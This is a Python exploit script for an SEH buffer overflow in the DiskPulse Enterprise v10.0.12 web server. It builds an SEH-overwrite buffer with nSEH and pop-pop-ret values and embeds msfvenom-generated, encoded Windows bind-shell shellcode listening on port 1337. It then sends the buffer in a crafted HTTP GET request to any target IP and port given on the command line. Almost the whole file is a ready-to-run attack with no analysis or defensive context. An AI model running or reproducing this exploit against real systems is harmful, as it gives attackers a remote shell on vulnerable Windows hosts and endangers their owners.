"""
Snowcra5h-SEH-DiskPulseEnt.py 
Author: snowcra5h@icloud.com

Vulnerability: SEH Overflow
- DiskPulse Enterprise v10.0.12 Web Server SEH Exploit
- http://www.diskpulse.com/setups/diskpulseent_setup_v10.0.12.exe
"""

import socket, sys, struct

bad_chars = [0, 0x2, 0x9, 0xa, 0xd, 0x20]

def get_payload() -> bytes:
    # msfvenom -p windows/shell_bind_tcp LPORT=1337 EXITFUNC=seh \
    # -e x86/shikata_ga_nai -b '\x00\x02\x09\x0a\x0d\x20' \
    # -v shellcode -f python
    shellcode = b""
    shellcode += b"\xbb\x39\x5e\x16\x21\xd9\xd0\xd9\x74\x24\xf4"
    shellcode += b"\x58\x33\xc9\xb1\x53\x31\x58\x12\x03\x58\x12"
    shellcode += b"\x83\xf9\x5a\xf4\xd4\x05\x8a\x7a\x16\xf5\x4b"
    shellcode += b"\x1b\x9e\x10\x7a\x1b\xc4\x51\x2d\xab\x8e\x37"
    shellcode += b"\xc2\x40\xc2\xa3\x51\x24\xcb\xc4\xd2\x83\x2d"
    shellcode += b"\xeb\xe3\xb8\x0e\x6a\x60\xc3\x42\x4c\x59\x0c"
    shellcode += b"\x97\x8d\x9e\x71\x5a\xdf\x77\xfd\xc9\xcf\xfc"
    shellcode += b"\x4b\xd2\x64\x4e\x5d\x52\x99\x07\x5c\x73\x0c"
    shellcode += b"\x13\x07\x53\xaf\xf0\x33\xda\xb7\x15\x79\x94"
    shellcode += b"\x4c\xed\xf5\x27\x84\x3f\xf5\x84\xe9\x8f\x04"
    shellcode += b"\xd4\x2e\x37\xf7\xa3\x46\x4b\x8a\xb3\x9d\x31"
    shellcode += b"\x50\x31\x05\x91\x13\xe1\xe1\x23\xf7\x74\x62"
    shellcode += b"\x2f\xbc\xf3\x2c\x2c\x43\xd7\x47\x48\xc8\xd6"
    shellcode += b"\x87\xd8\x8a\xfc\x03\x80\x49\x9c\x12\x6c\x3f"
    shellcode += b"\xa1\x44\xcf\xe0\x07\x0f\xe2\xf5\x35\x52\x6b"
    shellcode += b"\x39\x74\x6c\x6b\x55\x0f\x1f\x59\xfa\xbb\xb7"
    shellcode += b"\xd1\x73\x62\x40\x15\xae\xd2\xde\xe8\x51\x23"
    shellcode += b"\xf7\x2e\x05\x73\x6f\x86\x26\x18\x6f\x27\xf3"
    shellcode += b"\xb5\x67\x8e\xac\xab\x8a\x70\x1d\x6c\x24\x19"
    shellcode += b"\x77\x63\x1b\x39\x78\xa9\x34\xd2\x85\x52\x3f"
    shellcode += b"\x1a\x03\xb4\x55\x4c\x45\x6e\xc1\xae\xb2\xa7"
    shellcode += b"\x76\xd0\x90\x9f\x10\x99\xf2\x18\x1f\x1a\xd1"
    shellcode += b"\x0e\xb7\x91\x36\x8b\xa6\xa5\x12\xbb\xbf\x32"
    shellcode += b"\xe8\x2a\xf2\xa3\xed\x66\x64\x47\x7f\xed\x74"
    shellcode += b"\x0e\x9c\xba\x23\x47\x52\xb3\xa1\x75\xcd\x6d"
    shellcode += b"\xd7\x87\x8b\x56\x53\x5c\x68\x58\x5a\x11\xd4"
    shellcode += b"\x7e\x4c\xef\xd5\x3a\x38\xbf\x83\x94\x96\x79"
    shellcode += b"\x7a\x57\x40\xd0\xd1\x31\x04\xa5\x19\x82\x52"
    shellcode += b"\xaa\x77\x74\xba\x1b\x2e\xc1\xc5\x94\xa6\xc5"
    shellcode += b"\xbe\xc8\x56\x29\x15\x49\x68\xdb\xa7\x44\xfd"
    shellcode += b"\x42\x52\x25\x63\x75\x89\x6a\x9a\xf6\x3b\x13"
    shellcode += b"\x59\xe6\x4e\x16\x25\xa0\xa3\x6a\x36\x45\xc3"
    shellcode += b"\xd9\x37\x4c"

    return shellcode

def get_seh_overwrite() -> bytes:
    total_len = 6000
    offset_to_eip = 2499

    seh_chain = b'\x90' * (offset_to_eip - 4)
    seh_chain += struct.pack("I", 0x424208eb)       # nseh
    seh_chain += struct.pack("I", 0x1008868a)       # seh - ppr
    seh_chain += b'\x90' * 4                        # padding 
    seh_chain += b'\xe9\xd5\xc9\xff\xff'            # jmp to shellcode
    seh_chain += b'\x90' * 227                      # offset to shellcode
    seh_chain += get_payload()
    seh_chain += b'A' * (total_len - len(seh_chain)) # padding

    return seh_chain

def get_HTTP_request(buffer: bytes, host: str) -> bytes:
    # HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"

    return request

def send_exploit(sock: socket.socket, buffer: bytes, read_response=False):
    sock.send(buffer)
    print(f'[+] sent {len(buffer)} bytes')

    if read_response:
        resp = sock.recv(4096)
        print('[*] response:')
        print(resp)


def get_connection(ip: str, port: int, timeout: int = 5) -> socket.socket:
    sock = None
    while sock is None:
        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
        except ConnectionRefusedError:
            raise ConnectionRefusedError("Connection refused")
        except socket.timeout:
            raise TimeoutError("Connection timed out")
    return sock

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    host = sys.argv[1] # target ip
    port = sys.argv[2] # target port

    conn = get_connection(host, port)
    
    buffer = get_seh_overwrite()
    payload = get_HTTP_request(buffer, host.encode('utf-8'))

    send_exploit(conn, payload)

if __name__ == '__main__':
    main()
